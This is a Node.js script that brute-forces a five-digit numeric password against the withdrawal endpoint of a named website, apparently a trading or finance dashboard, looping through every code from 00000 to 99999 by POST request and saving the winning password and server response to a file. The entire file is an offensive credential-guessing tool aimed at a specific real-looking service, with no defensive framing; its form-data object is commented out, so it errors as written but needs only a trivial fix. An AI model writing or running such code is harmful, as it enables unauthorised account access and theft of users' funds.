const fs = require("fs");
const fetch = require("node-fetch"); // Fetch API for Node.js

// API URL
const API_URL = "https://pipsflow.net/dashboard/database/withdraw_query.php";

// Form data keys
// const formData = {
//   username: "exampleUser", // Replace with actual username or other required fields
//   email: "example@mail.com", // Replace with actual email or required fields
// };

// Function to pad numbers to 5 digits (e.g., 00001)
const padNumber = (num) => String(num).padStart(5, "0");

// Function to convert form data to URL-encoded format
const encodeFormData = (data) => {
  return Object.entries(data)
    .map(
      ([key, value]) =>
        `${encodeURIComponent(key)}=${encodeURIComponent(value)}`
    )
    .join("&");
};

// Function to make POST requests
const makePostRequest = async (password) => {
  try {
    // Add password to form data
    const bodyFormData = {
      ...formData,
      password, // Add dynamic password
    };

    const response = await fetch(API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: encodeFormData(bodyFormData),
    });

    const textResponse = await response.text();

    // Check for success (HTTP 200 with specific success conditions in response)
    if (response.ok && textResponse.includes("Success")) {
      // Adjust condition based on the success response
      console.log(`Successful password found: ${password}`);

      // Save the data to the file system
      fs.writeFileSync(
        "success.json",
        JSON.stringify(
          { formData: bodyFormData, response: textResponse },
          null,
          2
        )
      );
      console.log("Data saved to success.json");

      // Exit the loop by returning true
      return true;
    }
  } catch (error) {
    // Ignore errors to continue the loop
    console.error(`Error with password ${password}:`, error.message);
  }
  return false;
};

// Main function to iterate over all passwords
const bruteForce = async () => {
  console.log("Starting brute force...");
  for (let i = 0; i <= 99999; i++) {
    const password = padNumber(i);
    console.log(`Trying password: ${password}`);
    const isSuccess = await makePostRequest(password);

    if (isSuccess) {
      console.log("Password found! Exiting...");
      break;
    }
  }
  console.log("Brute force completed.");
};

// Run the brute force
bruteForce();
